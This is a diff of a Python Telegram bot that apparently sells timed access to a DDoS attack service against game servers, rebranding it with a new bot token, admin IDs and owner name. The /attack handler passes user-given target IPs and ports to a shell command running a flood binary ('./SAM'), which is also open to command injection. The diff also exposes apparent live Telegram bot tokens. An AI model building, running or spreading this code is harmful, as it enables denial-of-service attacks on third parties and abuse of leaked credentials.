@@ -14,10 +14,10 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7193772857:AAF_JCnwg4tMg1XDVlRkRGXgADMxUXo2frM')
+bot = telebot.TeleBot('7244429853:AAFD_sdfSY5gwGnj5JxmNvVE_dqeKtM7OIg')
 
 # Admin user IDs
-admin_id = ["1763792884","5924790094"]
+admin_id = ["6682104026",]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -141,12 +141,12 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found"
     else:
-        response = "Only @Vikas_Yadav29 Can Run This Command."
+        response = "Only ADMIN Can Run This Command."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['owner'])
 def show_owner(message):
-    response = "👑 Bot Owner: @Vikas_Yadav29"  # Replace with the actual owner username
+    response = "👑 ADMIN ONLY"  # Replace with the actual owner username
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['add'])
@@ -190,7 +190,7 @@ def add_user(message):
                     user_access[user_to_add] = {"expiry_time": expiry_timestamp}
                     # Save user access data
                     save_user_access(user_access)
-                    response = f"User {user_to_add} approved for {time_value} {time_unit} by @Vikas_Yadav29.\n\n\n 🅑🅞🅣 🅛🅘🅝🅚: @apexnewddosbot"
+                    response = f"User {user_to_add} approved for {time_value} {time_unit} by HOFFMAN.\n\n\n 🅑🅞🅣 🅛🅘🅝🅚: @METRIXDDOSBOT"
                 else:
                     response = "User already exists."
             except ValueError:
@@ -198,7 +198,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID followed by a positive integer with minute(s), hour(s), day(s), or month(s). \n\nExample Usage: /add 9999999999 3 hours('minutes', 'hours', 'days', or 'months')"
     else:
-        response = "Only @Vaibhav_dhami can run this command."
+        response = "Only ADMIN can run this command."
 
     bot.reply_to(message, response)
 
@@ -217,7 +217,7 @@ def show_recent_logs(message):
             response = "No data found "
             bot.reply_to(message, response)
     else:
-        response = "Only @Vikas_Yadav29 can run this command."
+        response = "Only ADMIN can run this command."
         bot.reply_to(message, response)
 
 @bot.message_handler(commands=['remove'])
@@ -242,7 +242,7 @@ def remove_user(message):
         else:
             response = "Please specify a user ID to remove."
     else:
-        response = "Only @Vikas_Yadav29 can run this command."
+        response = "Only ADMIN can run this command."
 
     bot.reply_to(message, response)
 
@@ -304,13 +304,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 600 :
-                response = "Error: Time interval must be less than 600."
+            if time > 300 :
+                response = "Error: Time interval must be less than 300."
             else:
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./SAM {target} {port} {time} 500"
+                full_command = f"./SAM {target} {port} {time} 400"
                 subprocess.run(full_command, shell=True)
                 response = f" 🚀 Attack  Finished! 🚀\n\nTarget IP: {target}\nPort: {port}\nDuration: {time} seconds"
         else:
@@ -318,9 +318,9 @@ def handle_bgmi(message):
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\n"
                     "Oops! it seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks,\n\n"
-                    "👉 Contact an Admin or the Owner @Vikas_Yadav29 for approval.\n"
+                    "👉 Contact an Admin or the Owner  for approval.\n"
                     "🌟 Become a proud supporter and purchase approval.\n"
-                    "💬 Chat with an Owner @Vikas_Yadav29 now and level up your capabilities!\n\n"
+                    "💬 Chat with an Owner now and level up your capabilities!\n\n"
                     "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
     
     bot.reply_to(message, response)
@@ -342,9 +342,8 @@ def welcome_start(message):
     response = (
         f"🥀Welcome {user_name}!\n\n"
         " For User ID : /id \n\n"
-        "👉 Join our official channel - @apex_bgmiserver ✅\n\n"
-        "👑 For access: @Vikas_Yadav29"
-        "👑 OWNER : @Vikas_Yadav29"
+
+        
     )
     bot.reply_to(message, response)
 
@@ -366,9 +365,9 @@ def show_access_expiry(message):
             "🚫 Unauthorized Access! 🚫\n\n"
             "Oops! It seems like you don't have permission to use the /plan command.\n"
             "To gain access and unleash the power of attacks,\n\n"
-            "👉 Contact an Admin or the Owner @Vikas_Yadav29 for approval.\n"
+            "👉 Contact an Admin or the Owner for approval.\n"
             "🌟 Become a proud supporter and purchase approval.\n"
-            "💬 Chat with an Owner @Vikas_Yadav29 now and level up your capabilities!\n\n"
+            "💬 Chat with an Owner now and level up your capabilities!\n\n"
             "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"
         )
     
@@ -396,7 +395,7 @@ def show_command_logs(message):
 
 @bot.message_handler(commands=['owner'])
 def show_owner(message):
-    response = "👑 Bot Owner: @Vikas_Yadav29"  # Replace with the actual owner username
+    response = "👑 HOFFMAN"  # Replace with the actual owner username
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
@@ -431,7 +430,7 @@ def clear_logs_handler(message):
         response = clear_logs()
         bot.reply_to(message, response)
     else:
-        bot.reply_to(message, "Only @Vikas_Yadav29 can run this command.")
+        bot.reply_to(message, "Only Admin can run this command.")
 
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
@@ -448,7 +447,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "No command logs found."
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! it seems like you don't have permission to use the /mylogs command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner @Vikas_Yadav29 for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner @Vikas_Yadav29 now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
+        response = ("🚫 Unauthorized Access! 🚫\n\n Oops! it seems like you don't have permission to use the /mylogs command. To gain access and unleash the power of attacks,\n\n you can:👉 Contact an Admin or the Owner  for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an Owner  now and level up your capabilities!\n\n🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!")
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['broadcast'])
@@ -457,7 +456,7 @@ def broadcast_message(message):
     if user_id in admin_id:
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
-            message_to_broadcast = "❌❌ ATTENTION EVERYONE ❌❌\n MEESSAGE FROM @Vikas_Yadav29:\n\n" + command[1]
+            message_to_broadcast = "❌❌ ATTENTION EVERYONE ❌❌\n MEESSAGE FROM HOFFMAN:\n\n" + command[1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
                 for user_id in user_ids:
@@ -469,7 +468,7 @@ def broadcast_message(message):
         else:
             response = "Please provide a message to broadcast."
     else:
-        response = "Only @Vikas_Yadav29 can run this command."
+        response = "Only Admin can run this command."
 
     bot.reply_to(message, response)
 
